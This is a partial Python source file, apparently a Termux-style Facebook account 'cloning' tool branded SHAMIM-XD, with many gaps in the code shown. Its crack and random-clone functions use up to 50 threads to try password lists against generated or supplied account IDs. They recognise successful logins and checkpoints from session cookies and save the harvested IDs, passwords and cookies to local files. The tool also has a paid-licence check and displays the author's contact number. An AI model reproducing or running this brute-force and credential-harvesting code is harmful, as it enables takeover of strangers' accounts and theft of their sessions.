...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SHAMIM-XD')
...
\033[1;91m--------------------------------------------
\033[1;91m[] CREATOR   > SHAMIM CYBER
\033[1;91m[] FACEBOOK  > SHAMIM KHAN
\033[1;91m[] GITHUB    > SHAMIM-CYBER
\033[1;91m[] VERSION   > 8.00
\033[1;91m[] WHATSAPP  > +8801616923594
\033[1;91m-------------------------------------------"""  )
...
def menu():
	os.system('clear')
	banner()
	_SHAMIM_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_SHAMIM_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_SHAMIM_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_SHAMIM_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_SHAMIM_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____SHAMIM_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____SHAMIM_____ in ['1']:
		C1()
	if _____SHAMIM_____ in ['2']:
		Y2()
	if _____SHAMIM_____ in ['3']:
		BER()
	if _____SHAMIM_____ in ['4']:
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(SHAMIM_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SHAMIM] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mSHAMIM-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\x1b[1;92m [\033[1;92mSHAMIM-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/SHAMIM-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as SHAMIM:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            SHAMIM.submit(SHAMIM,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSHAMIM-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/SHAMIM-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[SHAMIM-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801616923594?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SHAMIM%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://github.com/ShamimCyber/Paid/blob/main/Shamim.txt/main/approved.%20txt').text
    if key1 in r:
